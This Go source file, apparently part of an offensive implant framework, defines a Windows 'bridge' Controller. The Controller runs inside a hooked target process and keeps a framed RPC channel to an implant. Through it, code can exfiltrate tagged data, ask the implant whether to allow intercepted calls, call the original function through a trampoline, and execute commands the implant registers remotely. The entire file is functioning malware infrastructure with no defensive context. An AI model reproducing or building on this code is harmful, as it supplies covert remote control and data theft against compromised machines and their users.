//go:build windows

package bridge

import (
	"fmt"
	"io"
	"sync"
	"sync/atomic"
	"syscall"
)

// CommandHandler processes an RPC command and returns a response.
type CommandHandler func(data []byte) ([]byte, error)

// Controller drives a hook handler from within the target process.
// Standalone mode operates without communication; Connect mode enables
// real-time control from the implant via a bidirectional channel.
type Controller struct {
	conn       io.ReadWriteCloser
	argBlock   *ArgBlock
	standalone bool

	handlers map[string]CommandHandler
	pending  map[uint32]chan rpcResponse
	nextID   atomic.Uint32
	mu       sync.Mutex
	writeMu  sync.Mutex
}

// Standalone returns a Controller without communication. Ask returns Allow,
// Log/Exfil are no-ops, Register works but commands are never received.
func Standalone() *Controller {
	return &Controller{
		standalone: true,
		handlers:   make(map[string]CommandHandler),
		pending:    make(map[uint32]chan rpcResponse),
	}
}

// Connect returns a Controller backed by a bidirectional channel.
// Call Serve in a goroutine to start dispatching incoming messages.
func Connect(conn io.ReadWriteCloser) *Controller {
	return &Controller{
		conn:     conn,
		handlers: make(map[string]CommandHandler),
		pending:  make(map[uint32]chan rpcResponse),
	}
}

// Register adds a named RPC command handler. When the implant calls
// this command via Listener.Call, the handler executes in the target process.
func (c *Controller) Register(name string, handler CommandHandler) {
	c.mu.Lock()
	defer c.mu.Unlock()
	c.handlers[name] = handler
}

// SetArgBlock stores the captured arguments from the current hook invocation.
func (c *Controller) SetArgBlock(ab *ArgBlock) { c.argBlock = ab }

// Args returns the current ArgBlock, or an empty one if none was set.
func (c *Controller) Args() *ArgBlock {
	if c.argBlock == nil {
		return &ArgBlock{}
	}
	return c.argBlock
}

// CallOriginal invokes the trampoline with the given arguments.
func (c *Controller) CallOriginal(args ...uintptr) uintptr {
	if c.argBlock == nil || c.argBlock.TrampolineAddr == 0 {
		return 0
	}
	r, _, _ := syscall.SyscallN(c.argBlock.TrampolineAddr, args...)
	return r
}

// SetReturn is a no-op stub for API completeness.
func (c *Controller) SetReturn(_ uintptr) {}

// Log sends a log message to the implant.
func (c *Controller) Log(format string, a ...interface{}) {
	if c.standalone || c.conn == nil {
		return
	}
	c.lockedWriteWithID(msgLog, 0, []byte(fmt.Sprintf(format, a...)))
}

// Exfil sends tagged binary data to the implant.
func (c *Controller) Exfil(tag string, data []byte) {
	if c.standalone || c.conn == nil {
		return
	}
	c.lockedWriteWithID(msgExfil, 0, append([]byte(tag+"\x00"), data...))
}

// Ask sends a tagged call event and waits for a Decision.
// Returns Allow on any transport error.
func (c *Controller) Ask(tag string, data []byte) Decision {
	if c.standalone || c.conn == nil {
		return Allow
	}
	reqID := c.nextID.Add(1)
	ch := make(chan rpcResponse, 1)
	c.mu.Lock()
	c.pending[reqID] = ch
	c.mu.Unlock()

	payload := append([]byte(tag+"\x00"), data...)
	if err := c.lockedWriteWithID(msgCall, reqID, payload); err != nil {
		c.removePending(reqID)
		return Allow
	}

	resp := <-ch
	if resp.err != nil || len(resp.data) < 1 {
		return Allow
	}
	return Decision(resp.data[0])
}

// Heartbeat sends a ping and waits for pong.
func (c *Controller) Heartbeat() error {
	if c.standalone || c.conn == nil {
		return nil
	}
	reqID := c.nextID.Add(1)
	ch := make(chan rpcResponse, 1)
	c.mu.Lock()
	c.pending[reqID] = ch
	c.mu.Unlock()

	if err := c.lockedWriteWithID(msgHeartbeat, reqID, nil); err != nil {
		c.removePending(reqID)
		return err
	}

	resp := <-ch
	return resp.err
}

// Serve reads incoming messages and dispatches them. It handles RPC commands
// from the implant and routes responses to pending Ask/Heartbeat calls.
// Run in a goroutine.
func (c *Controller) Serve() error {
	if c.standalone || c.conn == nil {
		return nil
	}
	for {
		msgType, reqID, payload, err := readFrameWithID(c.conn)
		if err != nil {
			c.drainPending(err)
			return err
		}

		switch msgType {
		case msgCommand:
			go c.handleCommand(reqID, payload)

		case msgDecision, msgHeartbeat, msgResponse:
			c.mu.Lock()
			ch, ok := c.pending[reqID]
			if ok {
				delete(c.pending, reqID)
			}
			c.mu.Unlock()
			if ok {
				ch <- rpcResponse{data: payload}
			}

		default:
			// Legacy message without reqID — dispatch based on type.
			c.mu.Lock()
			ch, ok := c.pending[0]
			if ok {
				delete(c.pending, 0)
			}
			c.mu.Unlock()
			if ok {
				ch <- rpcResponse{data: payload}
			}
		}
	}
}

func (c *Controller) handleCommand(reqID uint32, payload []byte) {
	name, data := splitTagData(payload)

	c.mu.Lock()
	handler, ok := c.handlers[name]
	c.mu.Unlock()

	var resp []byte
	if ok {
		result, err := handler(data)
		if err != nil {
			resp = []byte("ERR:" + err.Error())
		} else {
			resp = result
		}
	} else {
		resp = []byte("ERR:unknown command: " + name)
	}

	c.lockedWriteWithID(msgResponse, reqID, resp)
}

// Close releases the connection and unblocks any pending RPCs.
func (c *Controller) Close() error {
	c.drainPending(fmt.Errorf("controller closed"))
	if c.conn == nil {
		return nil
	}
	return c.conn.Close()
}

func (c *Controller) lockedWriteWithID(msgType byte, reqID uint32, payload []byte) error {
	c.writeMu.Lock()
	defer c.writeMu.Unlock()
	return writeFrameWithID(c.conn, msgType, reqID, payload)
}

func (c *Controller) removePending(reqID uint32) {
	c.mu.Lock()
	delete(c.pending, reqID)
	c.mu.Unlock()
}

func (c *Controller) drainPending(err error) {
	c.mu.Lock()
	for id, ch := range c.pending {
		ch <- rpcResponse{err: err}
		delete(c.pending, id)
	}
	c.mu.Unlock()
}
